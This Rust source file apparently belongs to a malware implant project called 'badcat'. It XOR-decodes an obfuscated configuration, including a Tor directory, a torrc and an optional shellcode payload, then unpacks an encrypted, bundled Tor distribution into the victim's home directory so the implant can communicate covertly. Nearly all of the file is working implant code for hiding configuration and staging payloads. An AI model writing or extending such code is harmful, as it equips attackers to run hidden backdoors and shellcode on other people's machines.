use std::{error, io};
use std::path::PathBuf;

use badcat_lib::xor;
use crate::config;

pub struct Setting {
    pub key: String,
    pub name: String,
    pub tor_dir: PathBuf,
    pub torrc: String,
    pub shellcode: Vec<u8>,
    pub uses_shellcode: bool
}

impl Setting {
    pub fn new() -> Result<Setting, Box<dyn error::Error>> {
        let setting = load_settings()?;

        std::fs::create_dir_all(&setting.tor_dir)?;
    
        unbundle_tor(&setting)?;

        Ok(setting)
    }
}

pub fn load_settings() -> Result<Setting, Box<dyn error::Error>> {
    let key = String::from(config::ENC_KEY);
    let name = String::from(config::NAME);

    let tor_dir = xor::decode(
        &key,
        &String::from(config::ENC_TOR_DIR)
    )?;

    let torrc = xor::decode(
        &key,
        &String::from(config::ENC_TORRC)
    )?;

    let uses_shellcode = config::ENC_SHELLCODE != "";
    let shellcode = if uses_shellcode {
        xor::decode_bytes(
            &key,
            &String::from(config::ENC_SHELLCODE)
        )?
    } else {
        Vec::new()
    };

    let setting = Setting {
        name,
        key,
        torrc,
        tor_dir: expand_user_dir(&tor_dir),
        shellcode,
        uses_shellcode,
    };

    Ok(setting)
}

fn unbundle_tor(setting: &Setting) -> Result<(), Box<dyn error::Error>> {
    let bundle = config::ENC_TOR_BUNDLE;
    let bytes = xor::decode_bytes(&setting.key, &String::from(bundle))?;

    let mut ar = tar::Archive::new(io::Cursor::new(&bytes));
    ar.unpack(&setting.tor_dir.join("..").join(".."))?;
    Ok(())
}

fn expand_user_dir(path: &String) -> PathBuf {
    let mut home_dir = match dirs::home_dir() {
        Some(d) => d,
        None => panic!("problem finding home user directory")
    };

    home_dir.push(PathBuf::from(path));
    home_dir
}